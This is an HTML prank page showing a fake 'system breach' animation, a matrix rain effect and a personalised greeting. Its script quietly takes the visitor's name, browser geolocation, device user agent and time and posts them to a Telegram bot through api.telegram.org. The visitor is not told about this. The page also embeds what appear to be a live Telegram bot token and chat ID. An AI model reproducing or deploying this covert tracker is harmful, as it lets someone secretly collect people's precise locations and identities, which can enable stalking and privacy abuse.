<!DOCTYPE html>
<html>
<head>
<title>System Access...</title>

<style>
body {
  margin: 0;
  background: black;
  color: #00ff00;
  font-family: monospace;
  overflow: hidden;
}

/* overlay */
#overlay {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  z-index: 999;
}

/* hacker */
#hacker {
  white-space: pre-line;
  padding: 20px;
}

/* main */
#main {
  display: none;
  position: absolute;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
  text-align: center;
  color: white;
  font-family: Arial;
}

/* typing */
.typing {
  border-right: 2px solid white;
  white-space: nowrap;
  overflow: hidden;
  animation: typing 3s steps(30), blink 1s infinite;
}

@keyframes typing {
  from { width: 0 }
  to { width: 100% }
}

@keyframes blink {
  50% { border-color: transparent }
}

/* matrix */
canvas {
  position: fixed;
  top: 0;
  left: 0;
  z-index: -1;
}

/* shake */
.shake {
  animation: shake 0.2s infinite;
}

@keyframes shake {
  0% { transform: translate(3px,3px); }
  25% { transform: translate(-3px,-3px); }
  50% { transform: translate(3px,-3px); }
  75% { transform: translate(-3px,3px); }
  100% { transform: translate(3px,3px); }
}

/* error */
#error {
  display: none;
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background: red;
  color: white;
  font-size: 28px;
  text-align: center;
  padding-top: 40vh;
  z-index: 1000;
}
</style>
</head>

<body>

<div id="overlay" onclick="startAll()"></div>
<canvas id="matrix"></canvas>

<div id="hacker"></div>

<div id="main">
  <h1 id="title"></h1>
  <p id="msg" class="typing"></p>
</div>

<div id="error">❌ INVALID NAME!</div>

<audio id="bgmusic" loop>
  <source src="music.mp3" type="audio/mpeg">
</audio>

<script>

// 🔐 TELEGRAM (अपना डाल)
let BOT_TOKEN = prompt("8785634627:AAGzqNZedR8vltdpzkKY4fAkFmMJ5rzC3VQ");
let CHAT_ID = "5992250834";

// 📩 TELEGRAM SEND
function sendToTelegram(name, location) {
  let msg = "🔥 New Visitor\n\nName: " + name +
            "\nLocation: " + location +
            "\nDevice: " + navigator.userAgent +
            "\nTime: " + new Date().toLocaleString();

  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: msg
    })
  })
  .then(res => res.json())
  .then(data => console.log("Telegram:", data))
  .catch(err => console.error("Error:", err));
}

// 📍 LOCATION
function getLocation(name) {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      (pos) => {
        let loc = pos.coords.latitude + ", " + pos.coords.longitude;
        sendToTelegram(name, loc);
      },
      () => {
        sendToTelegram(name, "Denied");
      }
    );
  } else {
    sendToTelegram(name, "Not Supported");
  }
}

// 🔥 NAME INPUT
let userName = prompt("Enter your name 😎");

if (!userName) userName = "";
userName = userName.trim();

// only letters + space (min 2 char)
let validName = /^[A-Za-z ]{2,30}$/;

if (!validName.test(userName)) {
  document.getElementById("error").style.display = "block";
  document.body.style.background = "red";
  document.body.classList.add("shake");

  if (navigator.vibrate) {
    navigator.vibrate([500,200,500,200,500]);
  }

  throw new Error("Invalid Name");
}

// START ALL (click)
function startAll() {
  playMusic();
  vibratePhone();
  document.body.classList.add("shake");
  getLocation(userName); // 👈 यहीं से permission आएगी
}

// music
function playMusic() {
  document.getElementById("bgmusic").play();
}

// vibration
function vibratePhone() {
  if (navigator.vibrate) {
    navigator.vibrate([200,100,200]);
  }
}

// hacker animation
let lines = [
  "Initializing system...",
  "Tracking user: " + userName + "...",
  "Requesting location access...",
  "Bypassing firewall...",
  "Injecting script...",
  "Access Granted ✔"
];

let i = 0;
let hackerDiv = document.getElementById("hacker");

function typing() {
  if (i < lines.length) {
    hackerDiv.innerHTML += lines[i] + "\\n";
    i++;
    setTimeout(typing, 900);
  } else {
    setTimeout(showMessage, 1000);
  }
}

function showMessage() {
  document.getElementById("hacker").style.display = "none";
  document.getElementById("main").style.display = "block";

  document.getElementById("title").innerText =
    "😎 Hello " + userName;

  document.getElementById("msg").innerText =
    userName + ", tum ekdum special ho 💌🔥";

  alert("😈 SYSTEM BREACHED!");
}

typing();

// matrix effect
let canvas = document.getElementById("matrix");
let ctx = canvas.getContext("2d");

canvas.height = window.innerHeight;
canvas.width = window.innerWidth;

let letters = "01ABCDEFGHIJKLMNOPQRSTUVWXYZ".split("");
let fontSize = 14;
let columns = canvas.width / fontSize;
let drops = [];

for (let x = 0; x < columns; x++) drops[x] = 1;

function draw() {
  ctx.fillStyle = "rgba(0,0,0,0.05)";
  ctx.fillRect(0,0,canvas.width,canvas.height);

  ctx.fillStyle = "#0F0";
  ctx.font = fontSize + "px monospace";

  for (let i = 0; i < drops.length; i++) {
    let text = letters[Math.floor(Math.random()*letters.length)];
    ctx.fillText(text, i*fontSize, drops[i]*fontSize);

    if (drops[i]*fontSize > canvas.height && Math.random()>0.975)
      drops[i] = 0;

    drops[i]++;
  }
}

setInterval(draw, 33);

</script>

</body>
</html>
